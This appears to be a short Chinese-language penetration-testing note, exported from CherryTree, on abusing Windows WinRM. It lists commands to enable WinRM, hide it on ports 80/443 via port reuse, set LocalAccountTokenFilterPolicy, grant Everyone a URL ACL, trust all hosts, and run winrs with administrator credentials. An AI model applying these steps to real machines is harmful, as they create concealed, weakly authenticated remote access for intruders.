<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>winrm</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>winrm</h1><br/>原理：<br />winrm是一个远程管理程序，可以执行命令<br />通过端口复用隐藏<br /><br />win server 2008默认关闭 2012默认开启<br /><br />开启winrm并使用默认配置 需要修改网络连接类型为家庭或工作<br />将执行以下操作<br />1、启动winrm服务，并设置为自动启动<br />2、添加监听配置<br />3、添加防火墙规则<br />winrm quickconfig -q<br /><br />查看监听配置<br />winrm e winrm/config/listener<br /><br />查看配置<br />winrm get winrm/config<br /><br />新增http 80端口(默认5985  关闭的话，把true改成false)<br />winrm set winrm/config/service @{EnableCompatibilityHttpListener=&quot;true&quot;}<br /><br />新增https 443端口（默认5986）<br />winrm set winrm/config/service @{EnableCompatibilityHttpsListener=&quot;true&quot;}<br /><br />修改http默认端口<br />winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=&quot;80&quot;}<br /><br />允许管理员组所有账号访问（默认内置管理员）<br />reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br /><br /><br />添加acl，使得不需要身份验证<br />添加acl授予everyone对指定url的权限<br />netsh http add urlacl url=http://+:80/test user=everyone<br />删除：<br />netsh http delete urlacl url=http://+:80/test<br /><br /><br />连接远程winrm,语言环境需要一致<br />1、本地开启winrm服务<br />winrm quickconfig -q<br />2、允许连接所有主机<br />winrm set winrm/config/Client @{TrustedHosts=&quot;*&quot;}<br />删除该规则：<br />winrm set winrm/config/Client @{TrustedHosts=&quot;&quot;}<br /><br />3、连接<br />winrs -r:http://192.168.61.128:5985 -u:administrator -p:123456 &quot;whoami&quot;<br /><br />直接浏览器访问404，访问wsman 405<br />winrs连接过程中会暴露攻击者的用户名、域名等信息<br />useragent为winrm<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>